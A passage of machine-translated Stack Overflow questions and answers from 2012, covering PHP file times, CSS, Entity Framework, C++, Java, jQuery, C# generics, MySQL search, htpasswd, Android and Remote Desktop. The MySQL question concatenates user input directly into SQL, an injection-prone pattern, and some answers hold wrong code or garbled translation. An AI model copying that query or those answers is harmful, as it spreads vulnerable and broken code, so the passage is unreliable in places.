> 时间：2012-11-11T02:57:50.130

作为一般规则，当类似 的函数或访问文件的任何其他函数执行此操作时，**必须更改文件的访问时间。**`rename()`

至于更改文件的访问时间。这只能使用[触摸](http://php.net/manual/en/function.touch.php)功能，如手册中所述：

```
bool touch ( string $filename [, int $time = time() [, int $atime ]] ) 
```

> 尝试将 filename 参数中指定的文件的访问和修改时间设置为 time 中给定的值。请注意，无论参数数量如何，访问时间总是会被修改。

如您所见，时间参数在手册中描述为：

```
touch time 
```

> 如果未提供时间，则使用当前系统时间。

这是同一页面中的一个示例，该示例将访问时间从文件设置为一小时后：

```
<?php
    // This is the touch time, we'll set it to one hour in the past.
    $time = time() - 3600;

    // Touch the file
    if (!touch('some_file.txt', $time)) {
        echo 'Whoops, something went wrong...';
    } else {
        echo 'Touched file with success';
    }
?> 
```

但是，请注意，如上所述，触摸功能会**尝试**更改文件。例如，如果您没有权限，该函数将返回`false`. （并且不会更改文件时间）

干杯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:02:24.720

您可以使用 临时存储文件的访问时间并使用[`fileatime`](http://php.net/manual/en/function.fileatime.php)对其进行修改[`touch`](http://php.net/manual/en/function.touch.php)。

```
$filename = 'somefile.txt';
$original_timestamp = fileatime($filename);
// .. modify file here ..
touch($filename, $original_timestamp); 
```

# css - 这是一个 Firefox 错误吗？这个 input[type=""] 规则之后的 CSS 根本没有被读取

> ID：13328196
> 
> 赞同：0
> 
> 时间：2012-11-11T02:53:39.360
> 
> 标签：css, firefox, cross-browser

我即将启动一个站点并进入浏览器测试阶段，然后在 Firefox 中打开它，它完全被破坏了。我在一两个星期前看过它，它很好，所以我觉得这是一个导致很多错误的单一事物，而不是一大堆浏览器不兼容问题。

无论如何，经过一些调试后，我发现这条规则（如下）之后的所有 CSS 根本没有加载。我看不出这条规则有什么问题。我还确定这不是规则的内容（-webkit-appearance: none），而是 input[type=""] 选择器。

```
/* Remove rounded corners in mobile webkit browsers */
input[type="text",
input[type="submit"],
input[type="button"],
input[type="tel"],
input[type="email"],
input[type="search"],
select,
textarea {
    -webkit-appearance: none;
} 
```

有谁知道为什么这会导致 Firefox 问题？

现在我只是把它作为最后一条规则，这很好，因为这条规则不是针对 Firefox 的。但我真的很好奇它为什么会发生..？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T02:57:19.217

您在第一行有一个未闭合的括号：`input[type="text",`应该阅读`input[type="text"],`.

Firefox 通常会在遇到语法错误时停止解析 CSS 文件，这就是为什么不应用文件中的其余规则的原因。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-11T07:13:18.437

是的，这是一个 Firefox 错误，在错误处理中。我现在在 Bugzilla 中将其报告为[错误 810651](https://bugzilla.mozilla.org/show_bug.cgi?id=810651)：选择器中缺少“]”会导致样式表的其余部分被忽略。

如果您使用[W3C CSS Validator](http://jigsaw.w3.org/css-validator/)检查您的 CSS ，它的报告在这种情况下不是很具有描述性，只是“解析错误”，但至少您会看到您的 CSS 代码中有错误。此外，您仔细观察，您会看到它报告：

1 输入[type="submit"], input[type="button"], input[type="tel"], input[type="email"], input[type="search"], select, textarea 解析错误 [文字]

这里的 CSS 代码是指 Firefox 试图解析的内容，所以我们需要查看它之前的代码，因为这会影响解析模式。前一部分是`input[type="text",`，因此 Firefox 显然正在处理所有其余部分，就好像它在以“[”开头的属性选择器部分中一样。这样的错误处理是不正确的，因为根据[错误处理规则](http://www.w3.org/TR/CSS21/syndata.html#parsing-errors)，浏览器应该只跳过其余的*语句*。

当然，绕过这个错误的方法是修复你的 CSS 语法错误。

# asp.net-mvc-3 - DbEntityValidationException 但数据有效 - 如何调试？

> ID：13328197
> 
> 赞同：0
> 
> 时间：2012-11-11T02:54:40.073
> 
> 标签：asp.net-mvc-3, entity-framework

我从一个控制器方法中得到一个 DbEntityValidationException，该方法试图在`IsVisible`它从数据库中检索到的实体上设置布尔值。它通过页面上复选框的更改来响应 AJAX 帖子。该代码曾经有效。

```
var targetClass = db.Classes.FirstOrDefault(x => x.ID == cid);
targetClass.IsVisible = true;
db.SaveChanges(); 
```

这会导致`DbEntityValidationException`以下错误：

```
The SchoolYear field is required.
The TuitionPlan field is required. 
```

当我单步执行此代码时，两者`targetClass.SchoolYear`都是`targetClass.TuitionPlan`有效的。

问题是，我如何弄清楚为什么 EF 认为这些字段丢失了？

编辑：这可能与（太）延迟加载有关......如果我使用两个“缺失”字段，错误就会消失。可能没有什么比不知道为什么一个严重的问题会消失更令人担忧的*了*。

```
var targetClass = db.Classes.FirstOrDefault(x => x.ID == cid);
targetClass.IsVisible = value;
int x = targetClass.TuitionPlan.ID;
x = targetClass.SchoolYear.ID;
db.SaveChanges(); 
```

我真的需要有人来解释这里发生了什么，以及我将来应该如何防止这种情况。

感谢您的洞察力，埃里克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:30:38.167

我认为针对 null 验证导航属性不是一个好主意。导航属性设置为 null 意味着没有相关实体（您要验证的条件），但也可能意味着相关实体未加载。现在，向数据库发送一个额外的查询只是为了验证它似乎有点过头了，并且可能会导致性能问题（首先，您可能会向数据库发送大量查询，其次（除非您将实体加载为跟踪）您开始跟踪更多实际需要跟踪的实体）。另请注意，由于上述原因，验证会禁用延迟加载，直到验证完成。这可能是您看到错误的原因，即使在您的应用程序中启用了延迟加载。在验证期间，它将被禁用并且访问导航属性将不会加载相关实体。如果要验证是否存在相关实体，可以使用外键。请注意，它不需要加载相关实体并且应该相对容易做到。

# c++ - 函数参数中&和*的区别

> ID：13328199
> 
> 赞同：4
> 
> 时间：2012-11-11T02:54:53.653
> 
> 标签：c++

> **可能重复：**
> [指针和引用参数之间的区别？](https://stackoverflow.com/questions/620604/difference-between-a-pointer-and-reference-parameter)

使用 C++ 我想知道在参数中使用 & 和 * 有什么区别？

例如：

```
void swap(int &a, int &b)
{
    int temp = a;
    a = b;
    b = temp;
} 
```

这显然会交换整数 a 和 b。但是下面的函数不会完全一样吗？

```
void swap(int *a, int *b)
{
    int temp = *b;
    *b = *a;
    *a = temp;
} 
```

我只是想知道什么时候适合使用每一个，也许每一个的优点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:57:32.173

指针和引用的区别在于指针可以指向“无”，而引用不能。您的第二个示例应该在取消引用它们之前对指针进行空检查；没有必要对引用这样做。

# java - 在java中制作2个子类的数组的最佳方法

> ID：13328201
> 
> 赞同：0
> 
> 时间：2012-11-11T02:55:06.943
> 
> 标签：java

首先，我是 Java 新手，并且正在自学。

我的文件结构是：

1.  父类.java
2.  ChildClass1.java
3.  ChildClass2.java
4.  MyChildClasses.java

ChildClass1 和 2 都扩展了 ParentClass。MyChildClasses 有一个与子类一起使用的我的主要方法

在 MyChildClasses 中，主要看起来像这样

```
 ChildClass1[] myClass1 = new ChildClass1[5]
    ChildClass2[] myClass2 = new ChildClass2[5]

    for(int i = 0; i > 5; i++)
    {
        //Setting the ClassID #'s
        myClass1[i] = new ChildClass1((100+i))
        myClass2[i] = new ChildClass2((100+i), (i+1))
    } 
```

我想看看是否有办法把它变成1个可以同时包含两个子类的数组？...

使其更容易在屏幕上打印出来。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T02:59:07.593

您可以将数组声明为并`ParentClass[]`为其分配实例。`ChildClass1``ChildClass2`

不过，最好使用 java.util.List 为您服务：

```
List<ParentClass> list = new List<ParentClass>();
list.add(new ChildClass1());
// etc. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T02:59:40.690

```
ParentClass[] myClasses = new ParentClass[10]; 
```

`myClasses`将能够接受 type 的对象`ParentClass`，或任何扩展它的类，例如`ChildClass1`or `ChildClass2`。

# jquery - 有两个相互依赖的下拉菜单，其值根据选择的内容而变化？

> ID：13328205
> 
> 赞同：0
> 
> 时间：2012-11-11T02:57:09.197
> 
> 标签：jquery

您有三个下拉菜单：学期、课程、问题。问题下拉列表始终包含完整的问题列表。另外两个：学期，课程；它们取决于彼此的选择。

您在学期和课程中的选项是：所有学期、学期 A、学期 B、...、学期 N。课程也是如此：所有课程、课程 A、课程 B、...、课程 N。

所以，现在我所拥有的是，只要 3 个下拉菜单之一发生更改，就会有一个 ajax 调用，它使用选定的参数来查找图形数据。这意味着，例如，您可以在课程 B 的所有学期中找到 X 问题的图表。或在所有课程的学期 B 中找到 X 问题的图表。或者最后，课程 B 在 A 学期的 X 问题。

现在，我让它完美地工作。但问题是，在课程和学期中，您会看到该教授的课程和学期的完整列表。这意味着您可以选择不存在的组合。因此，例如，您可以在 W 学期为课程 B 选择 X 问题；也许在 W 学期，他教了一门课，而 B 课不是那门课。

我的目标是让课程和学期下拉菜单相互依赖。在服务器端，我为这些条件设置了查询等，它总是向我们发送一个对象，其中 Object.course 是应该在列表中的课程数组，而 Object.semester 是应该在列表中的课程数组列在名单上：

```
if Course and Semester == ALL:
    do: Object.course = all courses, 
        Object.semester = all semesters.

if Course == ALL:
    do: Object.semester = all semesters, 
        Object.course = all courses given during selected semester.

if Semester == ALL:
    do: Object.course = all courses, 
        Object.semester = all semesters when the selected course was given.

else
    do: Object.course = Two options: All, Selected Course,
        Object.semester = Two options: All, Selected Semester. 
```

在所有情况下，数组都包含 All 作为第一个选项，然后是多个选项，范围从 1 个附加选项到完整列表。

这是迄今为止我所拥有的一个jsfiddle。 [http://jsfiddle.net/gFRAZ/1/](http://jsfiddle.net/gFRAZ/1/) 我遇到的问题是，当我删除并重新添加选择选项时，它会发疯并开始删除错误的项目或删除所有项目。并且它不会保留我设置为 Selected 的选项作为选定选项。

我猜当它重新添加它们时，它会忽略 Selected 属性。

我曾尝试在 SO 和互联网上搜索，但经过数小时的游戏后，我无法解决问题。我希望有人能帮助我！先谢谢了。

示例数据对象：

```
var dropdown = new Object({course:['all', 'Course A', 'Course B'], semester:['all', 'Semester A', 'Semester B']}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:33:58.440

**我让它工作了！**

这是更新代码的链接：http: [//jsfiddle.net/gFRAZ/2/](http://jsfiddle.net/gFRAZ/2/)。

我很傻，试图更新错误的列表。一旦我意识到这一点，它就开始按我的预期工作。

当课程是全部时，我需要更新课程列表，而不是学期列表。当学期是全部时，我需要更新学期列表，而不是课程列表。当两者都为 All 或两者都不是 All 时，您可以使用设置值`$('#dropdown').val(dropdownValue);`，它不会触发 Change 事件。

所以在我的情况下：

```
if both = ALL
    Get the full link for both and set both values to all.
if Semester = ALL
    Change the Semester options
if Course = ALL
    Change the Course options
if neither are ALL
    Change both so that they only have ALL and the current selected value 
```

例如，当两者都不是全部时更改下拉列表时：

```
var semesterVal = $('#semester').val();
var courseVal = $('#course').val();

//For each that will populate the semesterArray.

//For each that will populate the courseArray.

$('#course').empty();
$('#semester').empty();

$('#semester').append(semesterArray);
$('#course').append(courseArray);

$('#course').val(courseArray);
$('#semester').val(semesterArray); 
```

# c# - 我可以从返回类型的类型中提取 Generic 的类型吗？

> ID：13328211
> 
> 赞同：2
> 
> 时间：2012-11-11T02:57:47.493
> 
> 标签：c#, generics

所以我有，比如说，这种方法：

```
public ICollection<String> doSomething() { } 
```

目前，我正在尝试检查方法的返回类型是否为 ICollection 类型。但是，在 C# 中，我必须在进行检查时传入一个泛型。所以我不能说，“方法是 ICollection”。

问题是我不想在检查时限制泛型的类型。在 Java 中，我可以只使用通配符，但在 C# 中我不能这样做。我曾想过尝试使用 Type.GetGenericParamterContraints() 并尝试将它的第一个结果粘贴在 ICollection 的通用约束中进行检查，但这也没有用。有人有什么想法吗？

```
isCollection(MethodInfo method){
    Type[] ret = method.ReturnType.GetGenericParametersContraint();
    Type a = ret[0];
    return method.ReturnType is ICollection<a>;
} 
```

编辑：添加了我尝试过的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T03:04:54.217

你应该能够做到：

```
MethodInfo method = ... // up to you
var returnType = method.ReturnType;

var isGenericICollection = returnType == typeof(ICollection<>); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:13:32.113

使用[Type.GetGenericTypeDefinition()](http://msdn.microsoft.com/en-us/library/system.type.getgenerictypedefinition.aspx)，并将其结果与`typeof(ICollection<>)`.

因此，要检查您的方法的返回类型是否为 an `ICollection`，您可以这样做：

```
method.ReturnType.GetGenericTypeDefinition() == typeof(ICollection<>) 
```

顺便提一句。`method.ReturnType is ICollection<a>`永远不会为真，因为`is`检查第一个操作数的类型是否是第二个操作数的子类型。`ReturnType`是 type`Type`虽然它不是 some 的子类型`ICollection`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T04:09:07.650

如果允许它是非泛型的`System.Collections.ICollection`（也由它实现`ICollection<T>`），那么它很简单：

```
typeof(System.Collections.ICollection).IsAssignableFrom(method.ReturnType) 
```

如果您只想与通用比较`ICollection<T>`（我认为没有理由，但您可能有自己的理由）：

```
method.ReturnType.IsGenericType 
  && typeof(ICollection<>)
  .IsAssignableFrom(method.ReturnType.GetGenericTypeDefinition()) 
```

请注意，如果返回类型是非泛型的，这将不起作用。`ICollection<T>`因此，如果有一个实现但本身不是泛型的类，它将不起作用。这意味着它不会捕获`class Foo : ICollection<string>`，但它*会*捕获`class Foo<T> : ICollection<T>`。

第一种方法会很好地抓住两者。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T03:50:26.457

试试这个，使用[MethodInfo.ReturnType](http://msdn.microsoft.com/en-us/library/system.reflection.methodbase.getparameters.aspx)来确定返回类型

```
Use the below method, call `isCollection<string>(method)` 

public static bool isCollection<T>(MethodInfo method)
{
    return method.ReturnType.Equals(typeof(ICollection<T>));
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-11T04:31:54.837

试试这个：

```
class Program
{
    public ICollection<string> Foo() { return new List<string>(); } 
    public static bool TestType()
    {
        MethodInfo info = typeof(Program).GetMethod("Foo");

        return info.ReturnType.GetGenericTypeDefinition() == typeof(ICollection<>);
    }
    static void Main(string[] args)
    {
        Console.WriteLine("{0} is ICollection<> : {1}", "Foo", TestType());
    }
} 
```

打印`Foo is ICollection<> : True`。

# php - 搜索名字和姓氏，按匹配准确度排序

> ID：13328213
> 
> 赞同：4
> 
> 时间：2012-11-11T02:58:22.673
> 
> 标签：php, mysql, search, sql-like

我正在尝试在我的网站（它是一个社交网站）上构建一个简单的搜索，我想搜索在该网站上注册的所有用户，并返回一个建议列表（这是这个查询的目的，建议列表）。

我要搜索的表具有以下列：`userID`, `fname`, `lname`。

我想搜索最后 2 列（2 个名称），并按照与搜索词匹配的名称顺序返回它们。

我将运行的查询的第一部分是：

```
SELECT userID, fname, lname FROM names WHERE 
```

但其余的，我需要帮助。

**编辑：** 使用此查询进行搜索：

```
SELECT userID, fname, lname FROM names WHERE fname LIKE '%".$term."%' OR lname LIKE '%".$term."%' 
```

我如何订购它，以便结果按匹配开始的那些排序，所以当我输入`M`它时，它会返回说，`Mark`之前`adam`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:41:08.500

你可以试试

```
SELECT userID, fname, lname,
myRank = CASE WHEN fname = @term THEN 4 
WHEN fname like @term + '%' THEN 3
WHEN fname like '%' + @term + '%' THEN 2
ELSE.... whatever ranking you want
FROM names 
WHERE fname LIKE '%' + @term + '%' 
   OR lname LIKE '%' + @term + '%'
ORDER BY myRank DESC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T03:09:09.747

您应该考虑使用[全文](http://dev.mysql.com/doc/refman/5.6/en/fulltext-search.html)搜索来搜索名称。全文搜索将允许您考虑匹配中的相似性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T08:57:47.363

我最近遇到了类似的问题，并使用[了 Microsoft Master Data Services 提供的 Similarity 功能](http://www.copypastecode.com/39177/)。从那里开始，我实现了一个基于单词的[三元组函数](http://ii.nlm.nih.gov/MTI/trigram.shtml)。我的实现将“海绵宝宝”与“鲍勃”相匹配。

如果您没有 Visual Studio（创建 sql-server 中使用的程序集所必需的），您还可以使用本机 T-SQL 实现所需的功能（即模糊字符串匹配）。可以在[这里](http://www.sqlservercentral.com/articles/SQL+Puzzles/sql2000dbatoolkitpart3/2363/)找到一个不错的工具包。

更新：注意：相似性字符串匹配在增量搜索中效果不佳，即“M”与“Mark”不匹配。您将不得不使用其他尝试，可能是模糊字符串匹配和分类为“开始于”、“包含”等的组合。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T03:01:32.463

类似的东西：

```
where fname like '%' + @searchterm + '%' or lname like '%' + @searchterm + '%' 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-11T04:01:09.357

您可以在查询语句的末尾执行 ORDER BY fname ASC （假设该语法适用于您的 DB 语句，它看起来像某种 SQL，所以应该有类似的东西）。这将按字母顺序对名称进行排序，因此 Steve 会出现在 Steven 之前（因为缺少“n”）。我也猜想如果你想根据第一个字母或前几个字母找到一些东西，可能有一个等价物，你可以使用 M* 并且星号将是你的通配符。我希望这会有所帮助！

# c++ - 解密使用 htpasswd 创建的密码

> ID：13328214
> 
> 赞同：46
> 
> 时间：2012-11-11T02:59:01.000
> 
> 标签：c++, apache, ubuntu, encryption, apache2

我在 ubuntu 中使用 apache2 为我的网页创建了保护。现在我正在用 c++ 创建一个应用程序，我希望它使用 Apache2 用于身份验证的相同文件，但我的问题是我不知道如何解密 apache2 生成的密码。（也许我需要一个用于加密的密钥）。

谢谢你。

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-11-11T03:05:36.373

.htpasswd 条目是[HASHES](http://en.wikipedia.org/wiki/Hash_function)。它们不是加密密码。哈希被设计为不可解密。因此，没有办法（除非你蛮力一段时间）从 .htpasswd 文件中获取密码。

您需要做的是将相同的哈希算法应用于提供给您的密码，并将其与 .htpasswd 文件中的哈希值进行比较。如果用户和哈希相同，那么你就可以了。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-01-28T21:41:50.220

特别参见[Apache HTTPd 密码格式](http://httpd.apache.org/docs/current/misc/password_encryptions.html)

# android - 在 SearchView 上强制图标化

> ID：13328217
> 
> 赞同：4
> 
> 时间：2012-11-11T02:59:20.067
> 
> 标签：android, actionbarsherlock, searchview

我的`SearchView`操作栏中现在有一个它应该完全正常工作，无论如何我有一个问题，当我单击提交按钮时，即提交查询并显示结果，当我返回到我开始搜索的活动时从`SearchView`扩展中，我的问题是如何关闭它，即在提交时将其图标化。这是我的代码。

```
searchView = (SearchView) item.getActionView();
            SearchManager searchManager = (SearchManager) getSystemService(Context.SEARCH_SERVICE);
            searchView.setSearchableInfo(searchManager
                    .getSearchableInfo(getComponentName()));
            searchView.setIconifiedByDefault(true);
            searchView.setIconified(true);
            searchView.setQueryRefinementEnabled(true);
            searchView
                    .setOnQueryTextListener(new SearchView.OnQueryTextListener() {

                        @Override
                        public boolean onQueryTextSubmit(String query) {
                            try {
                                  searchView = (SearchView) item.getActionView();
        SearchManager searchManager = (SearchManager) getSystemService(Context.SEARCH_SERVICE);
        searchView.setSearchableInfo(searchManager
                .getSearchableInfo(getComponentName()));
        searchView.setIconifiedByDefault(true);
        searchView.setIconified(true);
        searchView.setQueryRefinementEnabled(true);
        searchView
                .setOnQueryTextListener(new SearchView.OnQueryTextListener() {

                    @Override
                    public boolean onQueryTextSubmit(String query) {
                        try {

                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                        return false;
                    }

                    @Override
                    public boolean onQueryTextChange(String newText) {
                        // TODO Auto-generated method stub
                        return false;
                    }
                }); // doesnot work 
                            } catch (Exception ex) {
                                ex.printStackTrace();
                            }
                            return false;
                        }

                        @Override
                        public boolean onQueryTextChange(String newText) {
                            // TODO Auto-generated method stub
                            return false;
                        }
                    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-06T15:27:21.040

对于 API>=14，您可以使用`item.collapseActionView()`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-06T18:03:13.687

此解决方案有效：

```
@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getSupportMenuInflater().inflate(R.menu.home_screen, menu);

        SearchManager searchManager = (SearchManager) getSystemService(Context.SEARCH_SERVICE);
        final MenuItem searchMenuItem = menu.findItem(R.id.menu_search);
        final SearchView searchView = (SearchView) searchMenuItem
                .getActionView();
        searchView.setIconifiedByDefault(false);
        if (searchManager != null && searchView != null) {
            searchView.setSearchableInfo(searchManager
                    .getSearchableInfo(getComponentName()));

            searchView
                    .setOnQueryTextFocusChangeListener(new View.OnFocusChangeListener() {

                        @Override
                        public void onFocusChange(View v, boolean hasFocus) {

                            if (!hasFocus) {
                                if (searchMenuItem != null) {
                                    searchMenuItem.collapseActionView();
                                }// end if
                                if (searchView != null) {
                                    searchView.setQuery("", false);

                                }// end if
                            }// end if

                        }
                    });

            searchView
                    .setOnQueryTextListener(new SearchView.OnQueryTextListener() {

                        @Override
                        public boolean onQueryTextSubmit(String query) {
                            /**
                             * hides and then unhides search tab to make sure
                             * keyboard disappears when query is submitted
                             */
                            if (searchView != null) {
                                searchView.setVisibility(View.INVISIBLE);
                                searchView.setVisibility(View.VISIBLE);

                            }
                            return false;
                        }

                        @Override
                        public boolean onQueryTextChange(String newText) {
                            // TODO Auto-generated method stub
                            return false;
                        }
                    });

        }

        return super.onCreateOptionsMenu(menu);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-23T13:42:40.963

我从另一个问题中得到了这个，它似乎对我有用。

```
 @Override
 public void onStart()
 {
   if (mSearchView != null)
   {

       getSearchMenuItem().collapseActionView();
   }
 }
 @Override
public boolean onCreateOptionsMenu(Menu menu)
{
  //get your search view
  msearchMenuItem = menu.findItem(R.id.search);
}
public MenuItem getSearchMenuItem() {
             return msearchMenuItem;
} 
```

每次点击后退按钮时它都会关闭搜索视图（这会使活动进入 onStart()）

# remote-desktop - 远程桌面会话后窗口大小/位置发生变化

> ID：13328222
> 
> 赞同：0
> 
> 时间：2012-11-11T03:00:05.273
> 
> 标签：remote-desktop

我使用远程桌面从一台装有 Windows XP Professional SP3 和一个屏幕的笔记本电脑连接到一台运行 Windows 7 Professional 和两台显示器的远程 PC。

笔记本电脑的分辨率约为 1024x768，远程 PC 上的每个显示器约为 1600x900。

在开始远程桌面会话之前，我将 Windows 7 PC 的第二台显示器上的所有窗口移动到第一台显示器。（笔记本电脑和个人电脑都在同一个办公区域。）

远程桌面会话有效，但在关闭笔记本电脑上的会话并返回远程 Windows 7 PC 上工作后，我通常必须重新定位和调整许多窗口的大小才能恢复到原始排列。

使用我当前的配置，如何避免上面的“重新定位和调整大小”步骤？

如果笔记本电脑安装了 Windows 7 Professional，是否有助于解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T03:24:20.973

您可能应该将其移至超级用户，但由于您在 StackOverflow 上提出要求，因此您可以实现一个执行您所描述的程序。

在伪代码中：

```
class WindowPosition {
    IntPtr hWnd;
    RECT Location;
}

List<WindowPosition> positions = null;

void OnCaptureWindowPositionHotkey() {
    positions = new List<WindowPosition>();
    EnumWindows(enumStoreWindows, null);
}

void OnResetWindowPositionHotkey() {
    EnumWindows(enumStoreWindows, null);
}

void enumSetWindows(IntPtr hwnd, IntPtr obj) {
    positions.Add(new WindowPosition() {
        hWnd = hwnd,
        Location = GetWndLocation(hwnd)
    };
}

RECT GetWndLocation(IntPtr hwnd) {
    RECT outrect = null;
    GetWindowRect(hwnd, out outrect);
    return outrect;
}

void enumSetWindows(IntPtr hwnd, IntPtr obj) {
    var loc = (from wl in positions
              where wl.hWnd == hwnd
              select wl).FirstOrDefault();
    if (loc == null) return;
    SetWindowPos(hwnd, null, 
        loc.Location.X,
        loc.Location.Y,
        loc.Location.Width,
        loc.Location.Height,
        0);
} 
```

其中`EnumWindows`,`SetWindowPos`和`GetWindowRect`都是 Win32 函数。请参阅： http: [//msdn.microsoft.com/en-us/library/windows/desktop/ms633497](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633497(v=vs.85).aspx) (v=vs.85).aspx ， http: [//msdn.microsoft.com/en-us/library/windows /desktop/ms633545(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633545(v=vs.85).aspx)和[http://msdn.microsoft.com/en-us/library/windows/desktop/ms633519(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633519(v=vs.85).aspx)。

# objective-c - 在 Mac OS 中移动鼠标时，如何制作留在屏幕保护程序中的屏幕保护程序？

> ID：13328225
> 
> 赞同：1
> 
> 时间：2012-11-11T03:01:03.777
> 
> 标签：objective-c, macos, screensaver

我想在 Mac OS 10.8 中制作屏幕保护程序。当鼠标移动时，我很想留在屏幕保护程序中。要退出屏幕保护程序，需要单击一个按钮。有人对此有想法吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:17:38.987

我没有完整的答案，因为我不确定如何在 OSX 中捕获鼠标事件，但是如果您的屏幕保护程序代码在没有任何空闲时间的情况下运行，那么无论用户做什么，它都不会退出。要退出屏幕保护程序，需要给操作系统一些空闲时间来检查用户输入（如鼠标移动、按键等）。因此，在第一次`drawRect`调用时，您可以启动一个`while`循环来检查鼠标点击；如果从未单击鼠标，则控制将停留在循环中，并且屏幕保护程序不会退出。因此，您希望屏幕保护程序执行的所有操作都必须保留在该循环中。

这有帮助吗？

# php - $_REQUEST[var] 为空的常见原因？

> ID：13328230
> 
> 赞同：0
> 
> 时间：2012-11-11T03:02:16.707
> 
> 标签：php, wordpress, request

`$_REQUEST[var]`什么是无效的常见原因？

我正在传递`&redirect_to=somevalue` URI。当我`$_REQUEST['redirect_to']`在接收 PHP 代码中进行测试时，它似乎没有设置。这可能是服务器环境配置问题引起的吗？我在 ZippyKid 上，我知道他们非常重视安全性。

更新：这仍然没有修复。阅读下面的评论。一旦每个人都帮助我意识到问题可能是我作为“redirect_to”的值传递的 URL，我就去做了。但后来我发现，我暂时使用了“blah”这个词。所以现在我正在打这个：

[http://mysite.com/wp-login.php?action=lostpassword&sidedoorkey=2738jksdf98143lkadsf9534sdfadsf3f2321asdf53&redirect_to=blah](http://mysite.com/wp-login.php?action=lostpassword&sidedoorkey=2738jksdf98143lkadsf9534sdfadsf3f2321asdf53&redirect_to=blah)

但是 php 说 $_REQUEST['redirect_to'] 是一个零长度的字符串。o_o

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:09:07.493

尝试在每个字符串之前使用 urlencode，例如 redirect_to=urlencode('blah')：

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:05:09.073

我还没有解决这个问题，但我确实找出了问题的常见原因，所以我用它来回答这个问题。

我怀疑这个问题是由于 cookie 中的“粘性”变量造成的。如果 cookie 设置了相同的变量，它可能会覆盖在 _GET 或 _POST 中传递的重复变量的值。

这自然是使用 _REQUEST 的主要安全问题，以及为什么使用它是不好的做法。呸，愚蠢的 Wordpress 旧代码！希望我能弄清楚我的问题是否实际上是 cookie var，然后解决问题。我已经把代码倒了好几次，在其他任何地方都没有发现问题。

# php - 当局部变量不再存在时，mysql_query 是否释放内存？

> ID：13328235
> 
> 赞同：4
> 
> 时间：2012-11-11T03:03:41.587
> 
> 标签：php, mysql, memory-management

在类方法中使用 mysql_query 并将其设置为局部变量时，当方法完成执行或脚本结束时是否会释放内存？值得添加`mysql_free_result`吗？下面是例子。

```
class example{
    public function Query($query){
        $result = mysql_query($query);
        while ($row = mysql_fetch_assoc($result))
        {
            $this->rows[] =$row;
        }
    }
} 
```

方法完成时会释放内存还是需要在方法结束时调用`mysql_free_result`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T03:14:45.110

首先，`mysql_`不再维护 php 函数，因此您可能希望使用更多`OOP`方法，例如[mysqli](http://www.php.net/manual/en/book.mysqli.php)或[PDO](http://www.php.net/manual/en/ref.pdo-mysql.php)函数。

自从`mysql_free_result()`

> 将释放与结果标识符 result 关联的所有内存。

如果您要获取很多结果，那么是的，您可以（并且应该）使用此功能来释放您的 mysql 以节省内存。

至于你的其余问题：

> 方法结束时会释放内存还是需要在方法结束时调用 mysql_free_result ？

不，如果您不使用`mysql_free_result`内存，则不会在方法结束时释放内存，而是在脚本执行结束时释放内存。

我希望它有所帮助。干杯。

# algorithm - 网格切片/轮廓的算法和库？

> ID：13328244
> 
> 赞同：4
> 
> 时间：2012-11-11T03:05:39.387
> 
> 标签：algorithm, mesh, slice, g-code

我希望了解更多关于将网格切片到 gcode 中的过程，该过程采用 3d 模型并创建 CNC 机器或 3D 打印机可以使用的对象的 2D 切片。

使用什么数学算法来执行这种类型的网格抽取/切片？有没有实现其中一些的库？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-27T16:35:29.963

将切片器视为刀具路径生成器。本质上，您正在将您的 STL 网格编译为 G 代码，该代码告诉工具去哪里。与 3D 打印机相比，CNC 机器中记录的问题要好得多。

如果你在谷歌中输入“切片算法”，你不会得到太多。现在输入“刀具路径生成算法”，你会得到更多。3D 打印中发生的很多事情都源于 CNC 铣削理念。

虽然本文并不直接适用于 3D 打印机的切片，但它可能会让您了解 CNC 工具路径中的思考方式： [http ://www.sciencedirect.com/science/article/pii/ S001044859900024X](http://www.sciencedirect.com/science/article/pii/S001044859900024X)

[http://www.emeraldinsight.com/journals.htm?articleid=1538004](http://www.emeraldinsight.com/journals.htm?articleid=1538004)也是另一篇优秀的论文。

Slic3r 的源代码并不难理解，因此如果您想了解该过程，您可能需要先进行克隆。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-22T13:44:43.250

如果有人路过，也许他看到我的图书馆会有所帮助：

